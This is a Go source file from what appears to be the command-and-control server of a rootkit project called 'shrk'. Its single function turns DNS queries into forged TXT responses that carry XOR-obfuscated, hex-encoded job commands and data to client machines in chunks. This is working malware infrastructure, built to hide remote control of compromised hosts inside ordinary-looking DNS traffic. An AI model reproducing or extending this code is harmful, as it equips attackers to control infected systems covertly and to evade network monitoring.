package c2

import (
	"bytes"
	"encoding/binary"
	"io"

	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/util"
)

const RES_DATA_SIZE = 200

func (c2 *Type) ToResponse(packet *DNS_Packet, client *database.Client, job *joblist.Job) error {
	var (
		rdata *bytes.Buffer
		data  []byte
		size  int
		err   error
	)

	// modify the header to make it a valid DNS response
	packet.Header.Flags = 0
	packet.Header.Flags |= 0b10000001 << 8
	packet.Header.Flags |= 0b10000000

	// now lets add the answer section
	packet.Header.ANCount = 1
	packet.Answers = DNS_Record{
		Name:     packet.Question.Qname,
		Type:     16,
		Class:    1,
		TTL:      300,
		RDLength: 0,
		RData:    nil,
	}

	if nil == job {
		return nil
	}

	rdata = bytes.NewBuffer(nil)
	data = make([]byte, RES_DATA_SIZE)

	if job.PacketID == 0 {
		job.Data.Seek(0, io.SeekStart)
	}

	rdata.Write([]byte(job.ID))
	rdata.WriteByte(job.Command)
	binary.Write(rdata, binary.LittleEndian, job.PacketID)

	if size, err = job.Data.Read(data); err != nil && err != io.EOF {
		return err
	}

	if err == io.EOF {
		rdata.WriteByte(1) // last packet
		job.PacketID = 0
	} else {
		rdata.WriteByte(0) // not last packet
		job.PacketID++
	}

	rdata.Write(data[:size])

	client.XOR(rdata.Bytes())
	encoded, encoded_size := util.EncodeHex(rdata.Bytes())

	// the rdata length (TXT record length length + TXT record length)
	packet.Answers.RDLength = uint16(encoded_size + 1)

	// the actual data length
	packet.Answers.RData = append(packet.Answers.RData, byte(encoded_size))
	packet.Answers.RData = append(packet.Answers.RData, []byte(encoded)...)

	return nil
}
